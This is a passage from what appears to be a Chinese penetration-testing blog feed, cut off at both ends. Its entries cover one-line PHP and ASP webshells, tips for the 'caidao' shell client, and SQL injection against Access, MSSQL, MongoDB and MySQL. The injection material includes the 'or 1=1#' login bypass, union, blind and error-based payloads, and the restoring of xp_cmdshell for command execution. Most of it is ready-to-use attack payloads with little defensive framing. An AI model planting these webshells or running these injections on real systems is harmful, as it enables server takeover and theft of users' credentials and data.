title="一句话木马"></a>一句话木马</h3><p>常用：<br>PHP:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_POST[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p><p>IIS中ASP:<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;%<span class="hljs-keyword">eval</span> request(<span class="hljs-string">"x"</span>)%&gt;<br></code></pre></td></tr></table></figure></p><p><a href="https://www.cnblogs.com/Rcsec/p/9426301.html" target="_blank" rel="noopener"><strong><code>各种一句话木马大全</code></strong></a></p><hr><h3 id="菜刀shell"><a href="#菜刀shell" class="headerlink" title="菜刀shell"></a>菜刀shell</h3><p>常用命令：<br>查看已建立的连接<br>netstat -an | find “ESTABLISHED”</p><p>某些时候c:\windows\system32\cmd.exe拒绝访问，需要更换cmd路径来突破</p><p>我们先上传一个自己的cmd.exe (cmd.exe(本地路径C:WINDOWS\system32)，最好与目标机系统位数匹配，我们上传在www目录，于是此时cmd的物理路径为c:\www\cmd.exe：</p><p>Alt text</p><p>终端执行以下命令切换脚本调用的cmd.exe路径到c:\www\cmd.exe：</p><p>setp:c:\www\cmd.exe</p><p>一般情况下，此方法避免了执行命令时出现的拒绝访问错误</p>]]></content>
      
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> Injection </tag>
            
            <tag> WAF </tag>
            
            <tag> Passby </tag>
            
            <tag> file upload </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>其它常用数据库注入</title>
      <link href="/2019/01/08/Other-Database-Inject/"/>
      <url>/2019/01/08/Other-Database-Inject/</url>
      
        <content type="html"><![CDATA[<h2 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>Access 数据库是由微软发布的关联式数据库管理系统，主要用于存储数据、数据分析、开发软件<br>其最大的优点是：易学！不是学计算机专业的人员，也能学会。低成本地满足了那些从事企业管理工作的人员的管理需要，通过软件来规范同事、下属的行为，推行其管理思想。（.NET、VB、 C 语言等开发工具对于非计算机专业人员来说太难了，而 Access 则很容易） </p></blockquote><h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><ol><li>猜解表名、列名后，使用ASCII编码的方式进行boos型注入</li><li>通过猜解表名后，使用偏移注入爆出当前表所偶内容</li><li>通过跨库查询，查询其它数据库中内容</li></ol><h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><p>eg:<br>admin表有id，user，passwd三列<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;  <span class="hljs-comment"># 本查询查了三列</span><br>union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,* <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;  <span class="hljs-comment"># 此处*代表三列</span><br><br><span class="hljs-comment"># 定义a、b两个表，都代表admin</span><br>(admin <span class="hljs-keyword">select</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">as</span> b);<br><br><span class="hljs-comment"># *代表：输出a表和b表并列后的top 1 (第一行)的内容</span><br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,* <span class="hljs-keyword">from</span> (<span class="hljs-keyword">admin</span> <span class="hljs-keyword">as</span> a <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">and</span> a.id=b.id)<br></code></pre></td></tr></table></figure></p><h4 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h4><p><code>select * from [路径].库名</code><br>eg:<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">("<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> SqlIn(Sqlin_IP,SqlIn_Web,SqlIn_FS,SqlIn_CS,SqlIn_SJ) <span class="hljs-keyword">values</span>(<span class="hljs-string">'"&amp;Request.ServerVariables("REMOTE_ADDR")&amp;"'</span>,<span class="hljs-string">'"$Request.ServerVariables("URL")&amp;"'</span>,<span class="hljs-string">'POST'</span>,<span class="hljs-string">'"&amp;replace(Request.Form(Fy_Post),"'</span><span class="hljs-string">","</span><span class="hljs-string">'")&amp;"'</span>)<span class="hljs-string">")<br><br>&amp;=1"</span><span class="hljs-string">')") and union select 1,2,3 from news #</span><br></code></pre></td></tr></table></figure></p><h3 id="注入范例"><a href="#注入范例" class="headerlink" title="注入范例"></a>注入范例</h3><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">order by 3    <span class="hljs-comment"># 猜查询列数</span><br>union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>    <span class="hljs-comment"># 猜表</span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,pass,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>    <span class="hljs-comment"># 猜列</span><br><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)    <span class="hljs-comment"># 猜表</span><br><span class="hljs-keyword">and</span> <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)    <span class="hljs-comment"># 猜列</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">len</span>(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">0</span>    <span class="hljs-comment"># 猜列长</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(<span class="hljs-keyword">mid</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)&gt;<span class="hljs-number">97</span>    <span class="hljs-comment"># 猜列名</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> top <span class="hljs-number">1</span> <span class="hljs-keyword">asc</span>(<span class="hljs-keyword">mid</span>(username,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>)=<span class="hljs-number">97</span><br></code></pre></td></tr></table></figure><hr><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><blockquote><p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是Sybase，同时微软也和Sybase合作过 SQL Server 4.2版本的研发，微软亦将SQL Server 4.2移植到Windows NT（当时为3.1版），在与Sybase终止合作关系后，自力开发出SQL Server 6.0版，往后的SQL Server即均由微软自行研发。</p></blockquote><hr><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><h4 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h4><ul><li><strong>服务器角色</strong>：针对运行整个数据库服务器设定的角色和权限</li><li><strong>数据库角色</strong>：针对某个特定数据库设定的角色和权限</li></ul><table><thead><tr><th><strong>固定服务器角色</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>sysadmin</td><td>可以在SQL Server中执行任何活动</td></tr><tr><td>serveradmin</td><td>可以设置服务器范围的配置选项，关闭服务器</td></tr><tr><td>setupadmin</td><td>可以管理链接服务器和启动过程，并执行某些系统存储过程(如：sp_serveroption)</td></tr><tr><td>securityadmin</td><td>可以管理登录和CREATE、DATABASE权限，还可读取错误日志和更改密码</td></tr><tr><td>processadmin</td><td>可以管理在SQL Server实例中运行的进程</td></tr><tr><td>dbcreator</td><td>可以创建、更改和除去数据库</td></tr><tr><td>diskadmin</td><td>可以管理磁盘文件</td></tr><tr><td>bulkadmin</td><td>可以执行BULK INSERT语句</td></tr></tbody></table><p>判断当前服务器角色<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> is_srvrolemember(<span class="hljs-string">'sysadmin'</span>);<br></code></pre></td></tr></table></figure></p><hr><table><thead><tr><th><strong>固定数据库角色</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>db_owner</td><td>在数控中有全部权限</td></tr><tr><td>db_accessadmin</td><td>可以添加或删除用户ID</td></tr><tr><td>db_securityadmin</td><td>可以管理全部权限、对象所有权、角色和角色成员资格</td></tr><tr><td>db_ddladmin</td><td>可以发出ALL DDL，但不能发出GRANT、REVOKE或DENY语句</td></tr><tr><td>db_backupoperator</td><td>可以发出DBCC、CHECKPOINT和BACKUP语句</td></tr><tr><td>db_datareader</td><td>可以选择数据库内任何用户表中的所有数据</td></tr><tr><td>db_datawriter</td><td>可以更改数据库内任何用户表中的所有数据</td></tr><tr><td>db_denydatareader</td><td>不能选择数据库内任何用户表中的所有数据</td></tr><tr><td>db_denydatawriter</td><td>不能更改数据库内任何用户表中的所有数据</td></tr></tbody></table><p>判断当前数据库角色<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> is_member(<span class="hljs-string">'db_owner'</span>);<br></code></pre></td></tr></table></figure></p><hr><h3 id="扩展存储过程"><a href="#扩展存储过程" class="headerlink" title="扩展存储过程"></a>扩展存储过程</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>扩展存储过程是MsSQL提供的特殊功能。所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p><hr><h4 id="常见利用方法"><a href="#常见利用方法" class="headerlink" title="常见利用方法"></a>常见利用方法</h4><p>在SQL注入攻击过程中，最常利用到的扩展存储见下表：</p><table><thead><tr><th><strong>存储过程</strong></th><th><strong>利用方法</strong></th></tr></thead><tbody><tr><td>xp_cmdshell</td><td>直接执行系统命令</td></tr><tr><td>xp_regread</td><td>注册表读取</td></tr><tr><td>xp_regwrite</td><td>写入注册表</td></tr><tr><td>xp_dirtre</td><td>列目录操作</td></tr><tr><td>xp_enumds</td><td>ODBC连接</td></tr><tr><td>xp_loginconfig</td><td>配置服务器安全模式信息</td></tr><tr><td>xp_makecab</td><td>创建压缩卷</td></tr><tr><td>xp_ntsec_enumdomains</td><td>查看domain信息</td></tr><tr><td>xp_terminate_jroces</td><td>查看终端进程，给出一个进程PID</td></tr></tbody></table><hr><h4 id="检测与恢复扩展存储"><a href="#检测与恢复扩展存储" class="headerlink" title="检测与恢复扩展存储"></a>检测与恢复扩展存储</h4><p>提交如下查询进行检测，查看xp_cmdshell扩展存储过程是否被删除<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and 1=(<span class="hljs-keyword">Select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">FROM</span> master.dbo.sysobjects <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">name</span>=<span class="hljs-string">'xp_cmdshell'</span>)<br></code></pre></td></tr></table></figure></p><p>若扩展存储被删除，可执行如下查询进行恢复<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;exec sp_dropextendedproc 'xp_cmdshell'<br></code></pre></td></tr></table></figure></p><p>上诉一条查询语句，是在恢复前先删除xp_cmdshell，以后再在后面重新进行创建，随后执行如下查询<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;exec sp_dropextendedproc 'xp_cmdshell','xsql70.dll'<br></code></pre></td></tr></table></figure></p><p>该语句利用系统中默认的<code>xsql70.dll</code>文件，自动恢复xp_cmdshell，若恢复失败，则说明该文件已被改名或删除，可以上传一个<code>xsql70.dll</code>文件，自定义路径进行恢复。例如执行如下查询语句<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">;exec sp_dropextendedproc 'xp_cmdshell','c:\xsql70.dll'<br></code></pre></td></tr></table></figure></p><hr><h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><blockquote><p>MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案。<br>MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富，最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。Mongo最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引。</p></blockquote><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>属于nosql，没有库、表结构，只有对应关系</p><hr><h3 id="一些用法"><a href="#一些用法" class="headerlink" title="一些用法"></a>一些用法</h3><p>注入的一些例子<br><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">$id=1'&#125;);return (&#123;title:tojson(<br>db.Authority_confidential.find()[1]),2:'1'&#125;);<br><br>db.notice.findOne(&#123;'id':'$id'&#125;);<br>return(&#123;title:tojson(db.Authority_confidential.find()[1]),2:'1'&#125;);<br></code></pre></td></tr></table></figure></p><p>一些变量含义：<br>$gt ——- greater than &gt;<br>$gte —— gt equal &gt;=<br>$lt ——— less than &lt;<br>$lte ——– lt equal &lt;=<br>$ne ——— not equal !=<br>$eq ——— equal =</p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="http://www.makaidong.com/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E9%97%AE%E7%AD%94/11237.shtml" target="_blank" rel="noopener">http://www.makaidong.com/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E9%97%AE%E7%AD%94/11237.shtml</a></p><p>mssql/oracle<br>优点：适用于大型网络，适合分级管理<br>缺点：庞大，系统复杂</p><p>access、mssql使用工具首选穿山甲(pangolin)</p><p>渗透篇03-SQL Injection漏洞详解–手工挖掘（SQL server篇）<br><a href="https://blog.csdn.net/qq_38055050/article/details/79953652" target="_blank" rel="noopener">https://blog.csdn.net/qq_38055050/article/details/79953652</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Access </tag>
            
            <tag> MSSQL </tag>
            
            <tag> MongoDB </tag>
            
            <tag> Injection </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQL注入</title>
      <link href="/2019/01/01/SQL-injection/"/>
      <url>/2019/01/01/SQL-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="定义与概念"><a href="#定义与概念" class="headerlink" title="定义与概念"></a>定义与概念</h3><blockquote><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p></blockquote><hr><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul><li>过滤不严格</li><li>恶意用户构造的参数被执行<blockquote><p>当Web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></blockquote></li></ul><hr><h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><blockquote><p>把用户输入的数据当作代码来执行，违背了<strong>数据与代码分离</strong>原则</p></blockquote><h3 id="关键条件"><a href="#关键条件" class="headerlink" title="关键条件"></a>关键条件</h3><ul><li>用户能控制输入的内容</li><li>Web应用把用户输入的内容带入到数据库中执行</li></ul><hr><h3 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h3><p>后台登陆语句为：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">WHERE</span> Username = <span class="hljs-string">'user'</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Password</span> = <span class="hljs-string">'pass'</span><br></code></pre></td></tr></table></figure></p><p>由于只要结果不为空就返回真，也就是登陆成功。<br>因此，输入万能密码<code>or 1=1#</code><br>构造后的语句拼接为：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">WHERE</span> Username = <span class="hljs-string">'user'</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment"># and Password = 'pass'</span><br></code></pre></td></tr></table></figure></p><p>通过注释符<code>#</code>注释后面的语句，在<code>or 1=1</code>的基础结果为真恒成立</p><hr><h3 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h3><ol><li>根据请求方式不同可分为：</li></ol><ul><li><code>GET</code>方式请求注入</li><li><code>POST</code>方式请求注入<blockquote><p>差别：是否需要抓包</p></blockquote></li></ul><ol start="2"><li>根据SQL注入点的参数类型可分为：</li></ol><ul><li>整数型注入（int型）</li><li>字符型注入（char型）</li></ul><ol start="3"><li>根据反馈类型可分为以下常见几种：</li></ol><ul><li>基于显错</li><li>union类型</li><li>布尔类型</li><li>基于时间</li></ul><ol start="4"><li>根据是否回显：</li></ol><ul><li>显注：有回显，有报错，通常使用union联合查询</li><li>盲注：无回显或只有显示正常页面和不显示页面两种区别，内置结果要么输出，要么不输出，不会输出其他内容<blockquote><p>盲注分为：</p><ul><li>布尔型<code>bool</code></li><li>报错型<code>error</code></li><li>时间型<code>time</code></li></ul></blockquote></li></ul><hr><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><p><code>concat()</code><br>用于将多个字符串连接成一个字符串<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CONCAT</span>(<span class="hljs-string">'My'</span>,<span class="hljs-string">'S'</span>,<span class="hljs-string">'QL'</span>)<br></code></pre></td></tr></table></figure></p><p><code>group_concat()</code><br>将<code>group by</code>产生的同一个分组中的值连接起来，返回一个字符串结果<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc ] [separator '分隔符'] )<br></code></pre></td></tr></table></figure></p><p><code>concat_ws()</code><br>第一个参数为分隔符，将从第二个开始的字符拼接起来，并用第一个参数分隔符隔开：<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">concat_ws(separator, str1, str2,...)<br></code></pre></td></tr></table></figure></p><hr><h3 id="注入基本流程"><a href="#注入基本流程" class="headerlink" title="注入基本流程"></a>注入基本流程</h3><ol><li><p>判断是否有注入</p></li><li><p>获取数据库信息</p><blockquote><p>获取数据库基本信息<br>获取数据库名<br>获取表名<br>获取列名<br>获取用户数据</p></blockquote></li><li><p>破解数据</p></li><li><p>提升权限</p></li><li><p>内网渗透</p></li></ol><hr><h2 id="注入操作"><a href="#注入操作" class="headerlink" title="注入操作"></a>注入操作</h2><h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><ol><li>判断是否存在注入<figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">and 1=1<br>and 1=2<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>都有或都没输出，说明此处不存在注入</p></blockquote><ol start="2"><li><p>判断有多少列<br>使用二分法</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">order by n<br></code></pre></td></tr></table></figure></li><li><p>判断数据显示点</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,N<br></code></pre></td></tr></table></figure></li><li><p>查看数据库、用户基本信息</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">version</span>(),<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure></li><li><p>查询有哪些数据库，获取数据库名</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure></li><li><p>查询想要的数据中有哪些表，获取数据库中表名</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">'dvwa'</span><br></code></pre></td></tr></table></figure></li><li><p>查询想要的数据中有哪些列，获取数据库表中列名</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'dvwa'</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">'users'</span><br></code></pre></td></tr></table></figure></li><li><p>得到想要信息：</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> dvwa.users<br></code></pre></td></tr></table></figure></li></ol><blockquote><p><code>information_schema</code>库中重点关注以下三个表：<br><code>schemata  tables  columns</code></p></blockquote><h3 id="BOOL型盲注"><a href="#BOOL型盲注" class="headerlink" title="BOOL型盲注"></a>BOOL型盲注</h3><p><code>and or not &gt; = &lt;</code><br>返回结果非<code>true</code>即<code>false</code><br>以下均使用<code>二分法</code></p><ol><li><p>得到数据库名长度</p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (length(database()))&gt;5<br>and (length(database()))=4<br></code></pre></td></tr></table></figure></li><li><p>改变n的值依次获取数据库名的十进制ASCII值</p><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (ascii(substr(database(),n,1)))&gt;100<br></code></pre></td></tr></table></figure></li><li><p>获取数据库表名（先获取表名数量，再获取表名长度）</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())&gt;<span class="hljs-number">5</span><br><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">length</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)&gt;<span class="hljs-number">5</span><br><span class="hljs-keyword">and</span>(<span class="hljs-keyword">ascii</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure></li><li><p>获取列名（先获取列名个数，再获取列名长度，最后获取列名）</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (ascii(substr((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">'users'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))&gt;<span class="hljs-number">100</span><br></code></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))=<span class="hljs-number">68</span><br></code></pre></td></tr></table></figure></li></ol><hr><h3 id="盲注之报错注入"><a href="#盲注之报错注入" class="headerlink" title="盲注之报错注入"></a>盲注之报错注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>盲注：没有明显提示<br>报错注入：使语句出错，利用语法错误实现目的<br>必要条件：源代码会输出错误内容，如<code>mysql_error()</code>，还必须运行使用xml模块</p><h4 id="常用函数与用法："><a href="#常用函数与用法：" class="headerlink" title="常用函数与用法："></a>常用函数与用法：</h4><p>其他常用方法补充：<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener"><strong>十种MySQL报错注入</strong></a></p><hr><ol><li><code>floor()</code><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*),<span class="hljs-keyword">concat</span>(<span class="hljs-keyword">user</span>(),<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>查询结果至少存在三条才会触发报错，详见<a href="http://www.cnblogs.com/xishaonian/p/6227405.html" target="_blank" 